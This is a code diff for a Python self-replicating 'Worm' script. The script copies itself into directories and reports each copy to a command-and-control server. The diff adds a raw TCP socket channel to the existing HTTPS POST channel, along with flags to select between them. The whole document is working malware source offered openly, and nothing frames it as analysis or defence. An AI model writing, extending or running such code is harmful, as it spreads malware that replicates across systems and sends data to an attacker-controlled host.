@@ -2,12 +2,13 @@ import argparse
 import logging
 import os
 import shutil
+import socket
 import uuid
 from urllib import request, parse
 
 
 class Worm:
-    def __init__(self, c2ip=None, c2port=None, verbose=False):
+    def __init__(self, c2ip=None, c2port=None, c2sock=None, c2web=None, verbose=False):
         logging.basicConfig(
             format="[%(asctime)s] [%(levelname)s]: %(message)s",
             level=logging.INFO,
@@ -30,19 +31,41 @@ class Worm:
         self.c2port = c2port
         self.use_c2 = True
 
+        self.c2sock = c2sock
+        self.c2web = c2web
+
         logging.debug(f"Use C2 = {self.use_c2}")
         if self.use_c2:
             logging.debug(f"C2 IP = {self.c2ip}")
             logging.debug(f"C2 Port = {self.c2port}")
 
+            if not (self.c2sock or self.c2web):
+                logging.error(
+                    "If C2 should be used you need to specify how to send data"
+                )
+                raise Exception("C2 option not properly used. Missing comm channel")
+
     @staticmethod
     def set_loglevel_debug():
         logging.getLogger().setLevel(logging.DEBUG)
 
-    def contact_c2(self, msg):
+    def contact_c2_web(self, msg):
         data = parse.urlencode({"msg": msg}).encode()
         req = request.Request(f"https://{self.c2ip}:{self.c2port}", data=data)
-        request.urlopen(req)
+        try:
+            request.urlopen(req)
+        except:
+            logging.error("Cannot send web data")
+            pass
+
+    def contact_c2_sock(self, msg):
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            s.connect((self.c2ip, int(self.c2port)))
+            s.send(msg.encode())
+        except:
+            logging.error("Cannot send socket data")
+            pass
 
     def duplicate(self, to):
         shutil.copy(self.path, to)
@@ -99,7 +122,12 @@ class Worm:
             logging.debug(f"path = {path_}, dir = {dir_}, file = {file_}")
             if self.name not in file_:
                 self.duplicate(path_)
-                self.contact_c2(f"Duplicated to {path_}")
+                if self.c2sock:
+                    logging.debug("Sending Socket connection")
+                    self.contact_c2_sock(f"Duplicated to {path_}")
+                if self.c2web:
+                    logging.debug("Sending Web connection")
+                    self.contact_c2_web(f"Duplicated to {path_}")
 
 
 if __name__ == "__main__":
@@ -108,10 +136,12 @@ if __name__ == "__main__":
     parser.add_argument("-d", "--depth")
     parser.add_argument("-c2ip")
     parser.add_argument("-c2port")
+    parser.add_argument("-c2sock", action="store_true")
+    parser.add_argument("-c2web", action="store_true")
     parser.add_argument("-t", "--test", action="store_true")
     parser.add_argument("-v", "--verbose", action="store_true")
     args = parser.parse_args()
-    wurm = Worm(args.c2ip, args.c2port, args.verbose)
+    wurm = Worm(args.c2ip, args.c2port, args.c2sock, args.c2web, args.verbose)
     try:
         wurm.proliferate(
             base_dir=args.base_dir,
